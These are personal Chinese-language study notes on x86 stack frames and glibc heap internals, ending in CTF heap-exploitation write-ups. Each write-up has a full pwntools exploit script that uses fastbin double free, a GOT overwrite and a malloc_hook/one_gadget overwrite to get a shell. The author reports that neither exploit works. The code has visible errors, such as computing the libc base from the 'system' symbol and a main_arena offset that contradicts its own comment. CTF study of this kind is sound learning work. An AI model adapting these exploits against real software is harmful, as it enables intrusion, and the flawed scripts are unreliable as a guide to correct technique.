# **一、**  **函数调用栈**

32位程序：

  寄存器介绍、寄存器使用约定、栈帧结构、函数调用在栈上的实现。

## **1、32位程序的寄存器：**



![4](C:\Users\陈泽培\Desktop\学习用图\4.png)



  其中有8个32位通用寄存器，其中包含4个数据寄存器（EAX、EBX、ECX、EDX）、2个变址寄存器（ESI和EDI）和2个指针寄存器（ESP和EBP）；6个段寄存器（ES、CS、SS、DS、FS、GS）；1个指令指针寄存器（EIP）；1个标志寄存器（EFLAGS）。

  我们重点关注通用寄存器、指令寄存器和指令指针寄存器。

  数据寄存器用于保存操作数和运选结果等信息，所以在函数调用中用于保存函数的参数；而指针寄存器主要用于堆栈的访问，其中EBP基指针（Base Pointer）寄存器，ESP为堆栈指针（Stack Pointer）寄存器，关于他们的具体作用在之后会有所介绍；指令指针寄存器（EIP）用于存放下次将要执行指令的地址。

### **(1)、寄存器使用约定：**

  依照惯例，数据寄存器eax、edx、ecx为主调函数保存寄存器，用于保存主调函数的相关参数及运算数据。在函数调用的过程中，如果主调函数希望保存寄存器中的数值，就要在调用前将值保存在栈中，而后这些寄存器可以借给被调函数使用，在被调函数完成之后便可恢复寄存器的值；而寄存器ebx、esi、edi为被调函数保存寄存器，使用方法与上述类似。此外被调函数必须保持寄存器esp和ebp，并在函数返回后将其回复到调用前的值。具体过程将在后面有所提及。



###  **(2)、栈帧结构**

  栈区：由高地址向低地址生长，在程序运行的时候用于保存函数调用信息和存放局部变量。

  栈区在内存中的位置：

![1](C:\Users\陈泽培\Desktop\学习用图\1.png)

  栈帧的定义：在堆栈中，函数占用的一段独立的连续区域，称为栈帧（Stack Frame）.所以，栈帧是堆栈的逻辑片段。

  栈帧作为堆栈的逻辑片段，那么其必然就有边界。栈帧的边界由EBP和ESP界定，EBP指向栈帧的高地址，我们称之为栈底，而ESP指向栈帧的低地址，我们称之为栈顶。ESP会随着数据的出入栈而移动，因此函数中对于大部分数据的访问都基于EBP进行，这个点与之后的学习密切相关。

![2](C:\Users\陈泽培\Desktop\学习用图\2.png)

  上图中深色框框起来的部分就是一个栈帧。其中栈帧的具体结构由于参数与变量的不同而有所区别。

  从图中可以看到，函数调用的入栈顺序为实参n～1、主调函数的帧基地址EBP、被调函数的局部变量……

  所以可以根据上图给出函数调用栈的形成过程：主调函数按照调用约定依次入栈，然后将指令指针EIP入栈以保存主调函数的返回地址，也就是上图的返回地址处。而在进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。

### (3）、函数调用在栈上的实现

  上面已经给出了函数调用栈的形成构成，现在将根据具体的例子进一步讲解函数调用在栈上的实现。

```c
void swap(int *a,int *b)
{
    int tmp;
    tmp = *a;
    *a = *b;
    *b = tmp;
}
int main()
{
    int c=1,d=2;
    swap(&c,&d);
    return 0;
}
```

有这样一段代码，它的功能是交换参数c和d的值，下面我们分析结合函数调用栈来分析这个程序函数调用过程。

​    首先介绍一下函数调用过程中的主要指令：

​    **入栈（push):** 栈顶指针ESP减小4个字节（可理解为ESP向下移动）；以字节为单位将寄存器数据压堆栈，从高到低按字节依次将数据存入ESP-1、ESP-2、ESP-3、ESP-4指向的地址单元。

​    **出栈（pop):**  栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节（理解为ESP向上移动）。

  **调用(call)**：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。

   **离开(leave)**： 恢复主调函数的栈帧以准备返回。等价于指令序列mov %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和pop %ebp(恢复原ebp的值，即主调函数帧基指针)。

   **返回(ret)**：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。

​	结合以上代码，我们能够得到这样的过程：

1、 首先，main函数的栈帧中存有上一个函数的的返回地址和ebp，它自己的声明的局部变量存入栈中。

2、 main函数将swap函数所要求的参数&c, &d压入栈中，这里依照的调用约定是C调用约定，所以参数是从右往左压入。这里用到了汇编指令push &d , push &c，同时ESP向下移动。

3、 接着main函数调用call指令，call指令有两个步骤：把下一条指令的地址EIP压入栈中（push eip）;跳转到swap 函数（jmp swap）。到这里调用者main的任务就基本完成了。

4、 接下来来到swap函数的栈帧，首先将main函数ebp值压入栈中（push ebp）接着将esp和ebp移动到该处（mov ebp, esp）,这样两个指针就达到在一起时的状态了。

5、 接下来swap函数会根据情况开辟一定的栈空间，这一步是通过esp的移动来实现的，用汇编代码表示就是sub esp ,4。这里的意思时esp向下移动了4个字节的空间，用于存放声明的变量tmp 。

6、 之后swap函数形参*a, *b 的访问是通过ebp的偏移量来访问的。因为形参的值对应的时main函数中的变量，所以这里*a 就是ebp+8 ,*b 就是ebp+12 ， tmp就是ebp-4。

7、 接下来，swap函数完成了自己的任务了，接下来应该是栈帧回复到初始状态。

8、 首先swap调用leave指令，指令分为两步：返回esp , ebp 指针（mov esp , ebp），esp回到栈底，ebp回到了之前main函数ebp保存的位置；将栈中存放的ebp值弹出（pop ebp）,这时esp也向上移动4个字节。

9、 接着调用return指令，也就是将eip的值弹出（pop eip），将main函数下一条指令的地址存入eip中执行。

10、   接下来main函数就不需要&c ,&d参数了，esp向上移动8个字节（add esp ,8）。至此，main函数又回到了调用swap函数前的栈帧状态。

## **2、**64位程序

  64位程序的函数调用栈与32位的基本一致，但是64位程序相对于32位，增加了寄存器的数量，并且寄存器的名称也有所变化。

   64位有16个寄存器，而且实在32位寄存器的基础上增加了8个，只不过前8个寄存器在命名上与32位有所区别，将首字母e改成了r（比如esp改为了rsp）。

  在堆栈中，64位传递参数的方式也与32位有所区别，32位参数通过栈传递，而64位是通过寄存器（rdi、rsi、rdx、r8、r9）存放参数，只有在参数的数量为7或以上时，才将参数存放到栈中。所以这导致了32位函数栈帧的构建与64位有所区别，他们的具体体现在之后会有所提及。



# 二、缓冲区溢出



## 1、栈溢出攻击

## 2、堆溢出攻击

### (1）堆概述

**堆的定义：**是程序虚拟地址空间的一块连续的线性区域。在程序运行的过程中，用于提供动态分配内存，并且允许程序申请大小未知的内存。堆在内存中的位置在之前的图片中有所出现。

**堆的基本操作：**堆的分配、回收、堆分配背后的系统调用。

其中，管理堆的那部分程序称为堆管理器，其位于用户程序与内核中间，其功能主要为：

1、 相应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。

2、 管理用户所释放的内存。

**堆中的重要概念：**

**arena:** arena包含一片或数片连续的内存，堆块将会从这片区域划分给用户。主线程的arena被称为main_arena。

**allocated chunk:** 用户正在使用的堆块。

**free chunk:** 释放的堆块。

**bin:** 由free chunk组成的链表。

 **堆内存管理简介：**

**linux使用ptmalloc2内存管理机制，该机制由用户显式调用malloc()函数申请内存，调用free()函数释放内存。**

**malloc**  malloc使用brk或mmap系统调用来从操作系统获取内存。

**brk:**  brk通过增加程序中断位置（program_brk）从内核获取内存（非零初始化）。program—_break在堆未初始化时位于bss段的末尾。其移动通过brk()和sbrk()函数完成，从而实现堆的增长。

![堆](C:\Users\陈泽培\Desktop\学习用图\堆.jpg)



  最初，开始（start_brk）和堆段的结束（brk）将指向同一位置。根据是否开启ASLR，两者的位置会有所不同：不开启时，start_brk以及brk会指向data/bss段结尾；开启时，其位置在data/bss段结尾后的随机偏移处。

![dui1](C:\Users\陈泽培\Desktop\学习用图\dui1.png)

**mmap()和unmmap():**当用户申请内存过大时，ptamlloc2会选择通过mmap()函数创建匿名映射段供用户使用，并通过unmmap()函数回收。

### **(2)堆相关数据结构**

#### **微观结构：**

**malloc_chunk:**

​    chunk是glibc管理内存的基本单位，整个堆在初始化后会被当成一个free chunk，称为top chunk。（这个chunk在分配内存时，从低地址开始分配，所以top chunk总位于高地址处）

用户请求内存时，若bins中没有合适的chunk，malloc就会从top chunk中进行划分，如果top chunk的大小还不够，则调用brk()扩展堆，从新生成的top chunk中划分。

而释放内存时，释放的chunk将与其他相邻的free chunk合并

 

##### **chunk相关代码**

**request2size()：**申请chunk的大小。将请求的req转化为包含chunk头部（presize和size）的chunk大小。

**chunk2mem()和mem2chunk()：**malloc()和free()执行时指针的相关操作。（chunk与user data）

**chunk合并过程**：先向上后向下，如果向下合并的chunk时top chunk，则合并后形成新的top chunk；否则合并后加入unsorted chunk中。

**chunk拆分过程：**





##### **bin相关源码**

**fast bin相关：**

某些chunk都是比较小的内存块，专门分割这样的空间有些浪费资源，为了提高堆的利用率，使用fast bin组织。

其对应的变量为fastbinsY，采用单向链表组织bin。

其中的chunk一般不会与其他chunk合并，因为fast bin范围内的chunk的inuse始终被置为1。但如果合并后的chunk大于FASTBIN_CONSOLIDATION_THRESHOLOD，chunk会与其他的free chunk结合。

**malloc_consolidate函数：**

该函数的目的是解决fast bin中大量内存碎片的问题。在达到某些条件时，glibc就会调用该函数将fast bin中的chunk取出来，与相邻的free chunk合并后放入unsorted bin，或者与top chunk合并后形成新的top chunk。

**bins相关：**

（1）一个bin相当于一个chunk链表，每个bin的头节点chunk形成bins数组。

（2）由于每个bin的头节点的prev_size与size字段没有实际作用（根据prev_size与size的作用），所以在存储头节点chunk时只需存储fd和bk即可。

（3）其中的prev_size和size字段被下一个bin利用，作为其fd与bk，从而节省空间。

（4）bin介绍：unsorted bin: chunk没有进行排序（chunk的大小）；small bin：索引2到63的bin，两个相邻的chunk的大小相差字节数为两个机器字长（32位为8字节，64位为16字节）；large bins: small bin之后的bins。

（5）任意两个物理相邻的空闲chunk不能在一起。



#### **宏观结构**

**arena**：前面已经提到过了，需要注意的是：主线程的arena只有堆，子线程的arena可以有数片连续内存。（但并不是每个线程都会有对应的arena）。主线程的堆大小如果不够的话可以通过brk()调用来扩展，但是子线程分配的映射段大小固定，需要再次调用mmap()来分配新的内存。

**heap_info**：子线程arena的连续内存称为heap。每一个heap都有自己的heap header。heap_info便用于实现这样的功能。其中记录了当前堆的相关信息、上一个heap_info的地址等。**

**malloc_state：该结构用于管理堆，记录每个arena当前申请内存的具体状态(相当于arena_header，每个线程仅有一个)。**

##### **malloc**源码

_libc_malloc()：在glibc中实际上就是malloc()。

_int_malloc()：是内存分配的核心函数，具有具体的分配顺序和内存整理时机。

##### **free** **源码**

_libc_free()：就是free()。

_int _free()：判断、插入/合并。



### **(3)**堆溢出

**定义：**向某个堆块中写入的字节数超过了堆块本身可使用的字节数，导致数据溢出并覆盖到像相邻的下一个堆块。需要注意的是，堆管理器会调整用户申请的堆的大小，使得可利用的空间不低于用户申请的空间。

**堆溢出的攻击方向：**

**1、** **覆盖下一个chunk的内容（物理相邻），改变程序固有的执行流。**

**2、** **利用堆中的机制（如unlink）,实现任意地址写入或控制堆块中的内容等，从而控制程序的执行流。**

**重要步骤：**

**寻找堆分配函数（malloc()、calloc()、realloc()）。**

**寻找危险函数（get、scanf、vscanf、sprintf、strcpy、strcat、bcopy）**

(重点)确定填充长度：

**malloc()**的参数并不等于实际堆块的大小，分配出来的大小一般是字长的两倍（32位为8字节，64位为16字节），所以对于不大于两倍字长的请求，malloc会直接返回最小的chunk（两倍字长）。

**chunk**在申请时，并不处于释放状态，所以其prev_size字段会作为另一个chunk的成员。所以假如req = 24，那么request2size(24) = 24+8=32（因为此时bk和fd都会成为用户使用空间的一部分，此时只需要设置size参数，所以为24+8）。这个是该函数计算出来的所需chunk的最小空间，去除头部的16个字节后，就来到了16字节，这时最终用户分配到的字节数。那么，还有8个字节去哪里找呢？其实用户还可以使用下一个chunk的prev_size字段，这样就刚好24个字节了。

#### 得到shell的大致方向：

##### 未开启Full RELRO:

通过修改GOT表劫持程序的控制流。

##### 开启了Full RELRO:

劫持malloc hook函数，触发one_gadget得到shell。

#### 攻击类型：

##### **Fastbin attack**

**fastbin机制：**fastbin使用单链表维护释放的堆块，并且由fastbin管理的chunk即使被释放，其下一个chunk的prev_inuse位也不会清空。

**漏洞利用：**fastbin double free

free函数在释放fastbin时，只对main_arena指向的当前chunk进行检查，并且只指向bin的第一个chunk，容易导致double free。

double free的结果是bin的头部chunk的fd值不再为零，可指向下一个地址，通过修改fd的之后可将fastbin分配到任意位置。

![double](C:\Users\陈泽培\Desktop\学习用图\double.png)



**辅助方法：**

House Of Spirit(构造虚假的stack_chunk)

Alloc to Stack(劫持chunk指针到stack_chunk上)

Arbitrary Alloc(劫持chunk指针到去其他位置，比如到malloc_hook，改变该函数的内容，至于fake_chunk怎么找，看教程)。

###### 例题1：2014 hack.lu oreo

[题目地址：](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo)



exp:

```python
#encoding=utf-8
from pwn import*

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./oreo"
oreo = ELF("./oreo")
p = process('./oreo')
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')

def add(descrip,name):
    p.sendline('1')
    p.sendline(name)
    p.sendline(descrip)

def show_rifle():
    p.sendline('2')

def order():
    p.sendline('3')

def message(notice):
    p.sendline('4')
    p.sendline(notice)

def exp():
    print 'step 1. leak libc base'
    #申请0x38,实际用户拿到的只有0x34，剩下的去precv_size拿。
    name = 27*'a' + p32(oreo.got['puts'])
    #利用堆溢出泄露got表地址从而得到libc_base
    #*((_DWORD *)i + 13的的含义是i+13*4，其中DWORD是强制类型转换为4字节
    #所以next_chunk位于chunk的最后4个字节
    #所以打印出next_chunk的地址也就是put函数的got表位置
    add(25*'a',name)
    show_rifle()
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    puts_addr = u32(p.recvuntil('\n',drop=True)[:4])
    log.success('puts addr: '+ hex(puts_addr))
    libc_base = puts_addr - libc.symbols['system']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    print 'step 2. free fake chunk at 0x0804A2A8'

    #伪造fake_chunk，首先需要size值，需要大小与0x38一致，所以值应为0x40
    #这里要循环0x40次
    #将next_chunk的值改变为0x804a2a8,作为fake_chunk的入口
    oifle = 1
    while oifle < 0x3f:
        add(25*'a','a'*27 + p32(0))
        oifle += 1
    payload = 'a'*27 + p32(0x804a2a8)
    add(25*'a',payload)
    #还需要伪造next_chunk的size值，这里设置为0x100（只要在范围内即可）
    #查看0x0804a2a8的内容，为2c0,说明是从2c0处开始填充的，所以要填充0x38-0x18 =0x20
    #在填充next_chunk的prev_size为0x40
    #还要使ISMMAP为不能为1，这里为了方便全部用'\x00’填充
    #最后要使当前chunk的next指向0,这样循环只会执行1次
    """payload = 0x20*'\x00' + p32(0x40) + p32(0x100)
    payload = payload.ljust(52,'b')
    payload += p32(0)
    payload =  payload.ljust(128,'c')
    message(payload)"""
    payload = '\x00'*0x20
    payload += p32(0x40)
    payload += p32(0x20)
    message(payload)
    #free()chunk块，得到我们能进行修改的chunk
    order()
    p.recvuntil('Okay order submitted!\n')

    print 'step 3. get shell'
    #修改got表为system地址
    payload = p32(oreo.got['strlen']).ljust(20,'a')
    #将strlen函数的got表地址写到0x804a2a8上
    add(payload,'b'*20)
    log.success('system addr: ' + hex(system_addr))
    #将该地址修改为system函数的地址
    message(p32(system_addr) + ';/bin/sh\x00')

    p.interactive()

if __name__=="__main__":
    exp()
```

但是本地打不通，不知道为什么。

###### 例题2：2015 9447 CTF : Search Engine

[题目地址](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine)

题目分析：

首先了解其结构体，有sentence结构和word结构。其中word结构字长0x30，分别有word_addr、word_len、sentence_addr、sentence_len、next_chunk。对于结构体的分析要结合代码和gdb调试进行。

漏洞一：索引句子读字符串时无NULL结尾。

`write_check((__int64)v3, v2, 0);`

索引句子调用了这个函数，该函数的第三个参数为0。

```c
void __fastcall write_check(__int64 a1, int a2, int a3)
{
  int v3; // er14
  int v4; // ebx
  _BYTE *v5; // rbp
  int v6; // eax

  if ( a2 <= 0 )
  {
    v4 = 0;
  }
  else
  {
    v3 = a3;
    v4 = 0;
    while ( 1 )
    {
      v5 = (_BYTE *)(a1 + v4);
      v6 = fread((void *)(a1 + v4), 1uLL, 1uLL, stdin);
      if ( v6 <= 0 )
        break;
      if ( *v5 == 10 && v3 )
      {
        if ( v4 )
        {
          *v5 = 0;
          return;
        }
        v4 = v6 - 1;
        if ( a2 <= v6 - 1 )
          break;
      }
      else
      {
        v4 += v6;
        if ( a2 <= v4 )
          break;
      }
    }
  }
  if ( v4 != a2 )
    sub_400990("Not enough data");
}
```

结合该函数的内容可知，其在遇到回车作为结束符号时，永远不会将末位置NULL，所以在输出句子的时候容易leak出其他的数据。可以用于泄露lib基地址。在没有system函数的条件下这一步是必要的。（差找单词时并没有限制'\x00'。

```c
void Search_word()
{
  int v0; // ebp
  void *v1; // r12
  __int64 i; // rbx
  char v3; // [rsp+0h] [rbp-38h]

  puts("Enter the word size:");
  v0 = input();
  if ( (unsigned int)(v0 - 1) > 0xFFFD )
    sub_400990("Invalid size");
  puts("Enter the word:");
  v1 = malloc(v0);
  write_check((__int64)v1, v0, 0);
  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )
  {
    if ( **(_BYTE **)(i + 16) )
    {
      if ( *(_DWORD *)(i + 8) == v0 && !memcmp(*(const void **)i, v1, v0) )
      {
        __printf_chk(1LL, "Found %d: ", *(unsigned int *)(i + 24));
        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);
        putchar(10);
        puts("Delete this sentence (y/n)?");
        write_check((__int64)&v3, 2, 1);
        if ( v3 == 121 )
        {
          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));
          free(*(void **)(i + 16));
          puts("Deleted!");
        }
      }
    }
  }
  free(v1);
}
```

要泄露libc值，首先要知道我们能够利用的输入函数和输出函数，可以知道大概率是要对Index_sentence函数开刀的。__printf_chk函数负责输出Sentence长度；fwrite函数则负责输出Sentence的内容。

~~思路一：在Index_sentence时输入一个标记字符和puts函数的got表地址，再通过fwrite函数将其输出。但是有个问题：我并不清楚puts函数的got表地址一共有多少个字符，并且输入的为字节流~~————我傻逼了，got表地址仅仅是一个地址，还需要指针指向该地址才行。

要注意的是，chunk在使用时只是一个可利用的存储空间，里面的内容可以实现多种功能，但是在释放后，它还是具有chunk该有的结构，指针的指向规则不变。

###### unsorted bin（看看之后把这个相关知识加到哪）：

当我们free掉一个超过fastbin大小的chunk（0x20-0x80）时，其会被插入unsorted bin头部。若此时unsorted bin中仅有这一个chunk，并且该chunk的下一个块不是top_chunk，那么这个chunk的fd和bk指针均指向unsorted bin的起始地址。

使用上述特性，结合如下公式：

```
main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena（88）
libc_base = main_arena_addr - main_arena_offset(0x3c4b20)
```

即可得到libc地址。至于怎么得到各地址之间的偏移关系，之后再看看。

1、所以得到偏移的libc地址的步骤：申请unsort chunk、search第一次，free掉它，改变指针值、search第二次，打印出内容。

开启了RELRO，所以采用malloc_hook的方式拿shell。这需要我们构造fake_chunk。

2、首先构造fastbin循环链表：连续申请3个fast_chunk（注意与fake_chunk的大小一致）、按之前的思路，留一个标志位（相同，才能连续释放）、连续释放（由于释放后其在fastbin中，所以fd跟bk的值不为零，可以跳过验证，**并且，释放跟生成的指针顺序是相反的**）、释放b，构造循环链表。

根据代码可得循环链表的顺序为：arena_main->b->a->b->a。

3、构造fake_chunk：构造方法在上文。构造之后申请fd为fake_chunk的块，将fake_chunk加入fastbin；申请a、b chunk，这时候arena_main指向fake_chunk；最后一步：向fake_chunk中的malloc_hook位置上写上one_gadget（也是系统调用）就可以成功get shell。

```python
#coding=utf-8 
from pwn import*
import pwnlib
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
context(arch='i386',os='linux')

sh = process('./search')
#程序的main_arena到libc的基地址是固定的0x3c4b20
main_arena_offset = 0x3c4bb20
log.info('PID: ' + str(proc.pidof(sh)[0]))


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4
    offset += 4
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset

#计算main_arena与unsortedbin的偏移量
unsortedbin_offset_main_arena = offset_bin_main_arena(0)

def index_sentence(s):
    sh.recvuntil("3: Quit\n")
    sh.sendline('2')
    sh.recvuntil('Enter the sentence size:\n')
    sh.sendline(str(len(s)))
    sh.send(s)

def search_word(word):
    sh.recvuntil("3: Quit\n")
    sh.sendline('1')
    sh.recvuntil("Enter the word size:\n")
    sh.sendline(str(len(word)))
    sh.send(word)

#获取libc地址
def leak_libc():
    #构造一个任意大小的smallbin，在free后会成为unsorted_bin
    #其后的'b'是标志位，用于找到句子，注意空格以区分单词
    smallbin_sentence = 'a'*0x85 + ' b '
    index_sentence(smallbin_sentence)
    search_word('b')
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('y')
    #free掉chunk,使其fd指向unsortedbin_addr的位置
    #而因为单词chunk的句子的地址正是指向句子的fd，该值不为空，可绕过检查
    #标志位清零后也可通过'\x00'搜索
    search_word('\x00')
    #接受输出的unsortedbin_addr
    sh.recvuntil('Found ' + str(len(smallbin_sentence)) + ': ')
    unsortedbin_addr = u64(sh.recv(8))
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('n')
    return unsortedbin_addr

def exp():
    #1、获取libc地址
    unsortedbin_addr = leak_libc()
    main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena
    libc_base = main_arena_addr - main_arena_offset
    log.success('unsortedbin addr: ' + hex(unsortedbin_addr))
    log.success('libc base addr: ' + hex(libc_base))

    #2、构造fastbin循环链表
    #因为malloc_hook附近的chunk大小一般为0x70（0x7F），所以malloc_hook作为内容的fake_chunk的size同样也需要0x70
    #因为fake_chunk的大小为0x70，所以循环链表中的chunk的size也必须大于0x60，小于等于0x70
    index_sentence('a'*0x5d + ' d ')
    index_sentence('b'*0x5d + ' d ')
    index_sentence('c'*0x5d + ' d ')


    #free第一次,因为值d是相同的，所以会一起free掉
    search_word('d')
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('y')
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('y')
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('y')

    #free第二次，构造循环
    #由于chunk_c的指针值为零，所以没有通过验证
    search_word('\x00')
    #chunk_b
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('y')
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('n')
    #第一次创建的chunk
    sh.recvuntil('Delete this sentence (y/n)?\n')
    sh.sendline('n')

    #pwnlib.gdb.attach(proc.pidof(sh)[0],gdbscript="b main")
    #pause()


    #3、创建以malloc_hook地址为内容的fake_chunk
    fake_chunk_addr = main_arena_addr - 0x33
    print hex(fake_chunk_addr)

    #在这里填入的应该直接是fd的位置
    fake_chunk = p64(fake_chunk_addr).ljust(0x60,'f')
    #申请，使其中一个chunk_b的fd变为fake_chunk所在的地址
    #此时fake_chunk已经进入fastbin
    index_sentence(fake_chunk)
    index_sentence('a'*0x60)
    index_sentence('b'*0x60)
    #将a、b申请掉

    #后面的地址由工具得出，并不存在一致性
    one_gadget_addr = libc_base + 0xf02a4
    #fake_chunk的写入处与malloc_hook的偏移为0x13
    #0x23-0x10
    payload = 'a'*0x13 + p64(one_gadget_addr)
    payload = payload.ljust(0x60,'f')
    index_sentence(payload)

    sh.interactive()

if __name__=="__main__":
    exp()
```

艹，又打不通。

